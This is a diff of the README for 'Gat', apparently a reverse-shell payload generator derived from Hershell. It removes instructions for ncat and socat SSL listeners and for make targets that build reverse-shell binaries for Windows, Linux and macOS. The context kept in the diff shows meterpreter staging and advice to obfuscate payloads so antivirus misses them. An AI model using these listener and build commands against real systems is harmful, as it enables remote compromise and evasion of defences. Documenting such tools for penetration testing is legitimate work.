@@ -36,13 +36,6 @@ go build Mangle.go
 ```
 ## Usage
 Gat will use 'MSF's Multi Handler' by default.(If listener selected)\
-Other options are available such as:
-
-*socat\
-*ncat
-
-These shells can be upgraded to meterpreter shells using the 'meterpreter' command in Gat.
-
 ##Gat.sh to make things easy.
 ***WARNING*** Change CN in make file to accurately reflect you Orgs Certificate or Hostname of HTTPS server.
 ```
@@ -64,8 +57,6 @@ The following special commands are supported:
 ## Examples
 
 ### Basic usage
-
-
 
 ## Meterpreter staging
 **WARNING**: this currently only work for the Windows platform.
@@ -94,58 +85,6 @@ Then, in `Gat`, use the `meterpreter` command:
 [Gat]> meterpreter https 127.0.0.1:8443
 ```
 A new meterpreter session should pop in `msfconsole`:
-
-Here is an example with `ncat`:
-
-```
-ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
-```
-
-'socat' example (tested with version `1.7.3.2`):
-```
-socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
-```
-
-## Manually create GAT for more custom setup.
-***WARNING*** Generating this way will not apply mangle to the payload and could be caught by AV. \
-(Make sure to obfuscate it if you do this.)
-
-You will need to generate a valid certificate:
-```bash
-$ make depends
-openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
-Generating a 4096 bit RSA private key
-....................................................................................++
-.....++
-writing new private key to 'server.key'
------
-cat server.key >> server.pem
-```
-
-For windows:
-
-```bash
-# Predifined 32 bit target
-$ make windows32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make windows64 LHOST=192.168.0.12 LPORT=1234
-```
-
-For Linux:
-```bash
-# Predifined 32 bit target
-$ make linux32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make linux64 LHOST=192.168.0.12 LPORT=1234
-```
-
-For Mac OS X
-```bash
-# Predifined 32 bit target
-$ make macos32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make macos64 LHOST=192.168.0.12 LPORT=1234
-```
 
 ## Credits
 Ronan Kervella `<r.kervella -at- sysdream -dot- com>` - For his [Hershell](https://github.com/lesnuages.hershell) repo.\
